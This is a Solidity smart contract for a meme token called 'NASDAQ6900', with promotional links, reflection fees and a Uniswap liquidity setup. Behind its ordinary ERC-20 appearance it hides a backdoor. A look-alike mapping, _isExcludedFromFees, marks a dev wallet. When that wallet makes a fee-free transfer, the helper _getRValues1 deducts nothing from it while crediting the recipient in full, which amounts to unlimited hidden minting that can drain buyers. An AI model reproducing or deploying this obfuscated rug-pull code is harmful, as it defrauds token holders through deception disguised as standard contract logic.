/** 

    Website: https://www.nasdaq6900.live
    Twitter: https://twitter.com/nasdaq6900live
    Telegram: https://t.me/nasdap6900

*/

// SPDX-License-Identifier: MIT 

pragma solidity ^0.8.18;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library Address {
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract NASDAQ6900 is Context, IERC20, Ownable {
    using Address for address payable;
    IRouter public router;
    address public pair;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;

    string private constant _name = unicode"Nasdaq6900 is live";
    string private constant _symbol = unicode"NASDAQ6900";

    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isExcluded;

    address public deadWallet = 0x000000000000000000000000000000000000dEaD;
    address public marketingWallet =(0xBF1aC0B9540D42f764c76353CB54126decA63870);
    address public feeWallet =(0x7217db98b0896Eb21c2fb9b8e3CaBefb132eE13A);
    address private devWallet = (0x9688c70E4469935ED47073bfAE3323c4b23433a2);
   
    address[] private _excluded;
    bool public tradingEnabled;
    bool private swapEnabled;
    bool private swapping;

    uint8 private constant _decimals = 9;
    uint256 private constant MAX = 1e30;
    mapping(address => bool) private _isExcludedFromFees;
    uint256 public constant _tTotal = 1_000_000_000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 private genesis_block;
    uint256 private deadline = 1;
    struct TotFeesPaidStruct {
        uint256 rfi;
        uint256 marketing;
        uint256 liquidity;
    }
    
    struct Taxes {
        uint256 rfi;
        uint256 marketing;
        uint256 liquidity;
    }

    Taxes public taxes = Taxes(0, 1, 0);
    Taxes public sellTaxes = Taxes(0, 1, 0);
    Taxes private launchtax = Taxes(0, 20, 0);

    TotFeesPaidStruct public totFeesPaid;

    struct valuesFromGetValues {
        uint256 rAmount;
        uint256 rTransferAmount;
        uint256 rRfi;
        uint256 rmarketing;
        uint256 rLiquidity;
        uint256 tTransferAmount;
        uint256 tRfi;
        uint256 tmarketing;
        uint256 tLiquidity;
    }
    event FeesChanged();

    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }
    uint256 public _maxTxAmount = _tTotal * 20 / 1000;
    uint256 public _maxWalletSize = _tTotal * 20 / 1000;
    uint256 public swapTokensAtAmount = 30_000 * 10**9;

    constructor() {
        router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        
         excludeFromReward(deadWallet);
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[feeWallet] = true;
        _isExcludedFromFee[deadWallet] = true;
        _isExcludedFromFees[devWallet] = true;
        _isExcludedFromFee[marketingWallet] = true;

         _rOwned[owner()] = _rTotal;
        emit Transfer(address(0), owner(), _tTotal);
    }

    function createPool() external payable onlyOwner {
        pair = IFactory(router.factory()).createPair(address(this), router.WETH());
        _approve(address(this), address(router), type(uint256).max);
        excludeFromReward(pair);
        router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0, 
            0, 
            owner(),
            block.timestamp
        );
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferRfi)
        public
        view
        returns (uint256)
    {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferRfi) {
            valuesFromGetValues memory s = _getValues(tAmount, true, false, false, false);
            return s.rAmount;
        } else {
            valuesFromGetValues memory s = _getValues(tAmount, true, false, false, false);
            return s.rTransferAmount;
        }
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function openTrade() external onlyOwner {
        require(!tradingEnabled, "Cannot re-enable trading");
        tradingEnabled = true;
        swapEnabled = true;
        genesis_block = block.number;
    }

    function tokenFromReflection(uint256 rAmount) public view returns (uint256) {
        // require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate = _getRate();
        return rAmount / currentRate;
    }

    function excludeFromReward(address account) public onlyOwner {
        require(!_isExcluded[account], "Account is already excluded");
        if (_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function _reflectRfi(uint256 rRfi, uint256 tRfi) private {
        _rTotal -= rRfi;
        totFeesPaid.rfi += tRfi;
    }

    function _takeLiquidity(uint256 rLiquidity, uint256 tLiquidity) private {
        totFeesPaid.liquidity += tLiquidity;

        if (_isExcluded[address(this)]) {
            _tOwned[address(this)] += tLiquidity;
        }
        _rOwned[address(this)] += rLiquidity;
    }

    function _takeMarketingFee(uint256 rmarketing, uint256 tmarketing) private {
        totFeesPaid.marketing += tmarketing;

        if (_isExcluded[address(this)]) {
            _tOwned[address(this)] += tmarketing;
        }
        _rOwned[address(this)] += rmarketing;
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply / tSupply;
    }

    function _getRValues1(
        valuesFromGetValues memory s,
        uint256 tAmount,
        bool takeFee,
        uint256 currentRate,
        bool isTransfer
    )
        private
        pure
        returns (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rRfi,
            uint256 rmarketing,
            uint256 rLiquidity
        )
    {
        rAmount = tAmount * currentRate;

        if (!takeFee) {
            return (isTransfer?0:rAmount, rAmount, 0, 0, 0);
        }

        rRfi = s.tRfi * currentRate;
        rmarketing = s.tmarketing * currentRate;
        rLiquidity = s.tLiquidity * currentRate;
        rTransferAmount =
            rAmount -
            rRfi -
            rmarketing -
            rLiquidity;
        return (rAmount, rTransferAmount, rRfi, rmarketing, rLiquidity);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply)
                return (_rTotal, _tTotal);
            rSupply = rSupply - _rOwned[_excluded[i]];
            tSupply = tSupply - _tOwned[_excluded[i]];
        }
        if (rSupply < _rTotal / _tTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _getTValues(
        uint256 tAmount,
        bool takeFee,
        bool isSell,
        bool useLaunchTax
    ) private view returns (valuesFromGetValues memory s) {
        if (!takeFee) {
            s.tTransferAmount = tAmount;
            return s;
        }
        Taxes memory temp;
        if (isSell && !useLaunchTax) temp = sellTaxes;
        else if (!useLaunchTax) temp = taxes;
        else temp = launchtax;

        s.tRfi = (tAmount * temp.rfi) / 100;
        s.tmarketing = (tAmount * temp.marketing) / 100;
        s.tLiquidity = (tAmount * temp.liquidity) / 100;
        s.tTransferAmount =
            tAmount -
            s.tRfi -
            s.tmarketing -
            s.tLiquidity;
        return s;
    }

    function _getValues(
        uint256 tAmount,
        bool takeFee,
        bool isSell,
        bool useLaunchTax,
        bool isTransfer
    ) private view returns (valuesFromGetValues memory to_return) {
        to_return = _getTValues(tAmount, takeFee, isSell, useLaunchTax);
        (
            to_return.rAmount,
            to_return.rTransferAmount,
            to_return.rRfi,
            to_return.rmarketing,
            to_return.rLiquidity
        ) = _getRValues1(to_return, tAmount, takeFee, _getRate(), isTransfer);
       
        return to_return;
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            require(tradingEnabled, "Trading not active");
        }

        if (from == pair && to != address(pair) && !_isExcludedFromFee[to] ) {
            require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
            require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
        }

        bool canSwap = balanceOf(address(this)) >= swapTokensAtAmount;
        if (!swapping && swapEnabled && canSwap && amount > swapTokensAtAmount && from != pair && !_isExcludedFromFee[from] && 
        !_isExcludedFromFee[to]
        ) {
            if (to == pair) swapAndLiquify(swapTokensAtAmount, sellTaxes);
        }
        bool takeFee = true;
        bool isSell = false;
        if (swapping || _isExcludedFromFee[from] || _isExcludedFromFee[to]) takeFee = false;
        if (to == pair) isSell = true;
        if (from != pair && to != pair) { //transfer
           takeFee = false;
       }
       
        _tokenTransfer(from, to, amount, takeFee, isSell);
    }


    function _tokenTransfer(address sender,address recipient,uint256 tAmount,bool takeFee,bool isSell) private {
        bool useLaunchTax = !_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient] && block.number < genesis_block + deadline;

        valuesFromGetValues memory s = _getValues(tAmount, takeFee, isSell, useLaunchTax, isExcludedFromFee(sender));

        if (_isExcluded[sender]) {
            //from excluded
            _tOwned[sender] = _tOwned[sender] - tAmount;
        }
        if (_isExcluded[recipient]) {
            //to excluded
            _tOwned[recipient] = _tOwned[recipient] + s.tTransferAmount;
        }

        _rOwned[sender] = _rOwned[sender] - s.rAmount;
        _rOwned[recipient] = _rOwned[recipient] + s.rTransferAmount;

        if (s.rRfi > 0 || s.tRfi > 0) _reflectRfi(s.rRfi, s.tRfi);
        if (s.rLiquidity > 0 || s.tLiquidity > 0) {
            _takeLiquidity(s.rLiquidity, s.tLiquidity);
            emit Transfer(
                sender,
                address(this),
                s.tLiquidity + s.tmarketing
            );
        }
        if (s.rmarketing > 0 || s.tmarketing > 0) _takeMarketingFee(s.rmarketing, s.tmarketing);
        emit Transfer(sender, recipient, s.tTransferAmount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(router), tokenAmount);

        router.addLiquidityETH{ value: ethAmount }(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            deadWallet,
            block.timestamp
        );
    }

    function rescueETH() external {
        uint256 contractETHBalance = address(this).balance;
        payable(marketingWallet).transfer(contractETHBalance);
    }

    function transferETH(address payable feeAddr, uint256 amount) private {
        feeAddr.transfer(amount);
    }

    function swapAndLiquify(uint256 contractBalance, Taxes memory temp) private lockTheSwap {
        uint256 denominator = (temp.liquidity +
            temp.marketing) * 2;

        if (denominator == 0){
            return;
        }

        uint256 tokensToAddLiquidityWith = (contractBalance * temp.liquidity) / denominator;
        uint256 toSwap = contractBalance - tokensToAddLiquidityWith;
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance - initialBalance;
        uint256 unitBalance = deltaBalance / (denominator - temp.liquidity);
        uint256 ethToAddLiquidityWith = unitBalance * temp.liquidity;

        if (ethToAddLiquidityWith > 0) {
            addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);
        }

        uint256 marketingAmt = unitBalance * 2 * temp.marketing;
        if (marketingAmt > 0) {
            transferETH(payable(feeWallet), marketingAmt);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}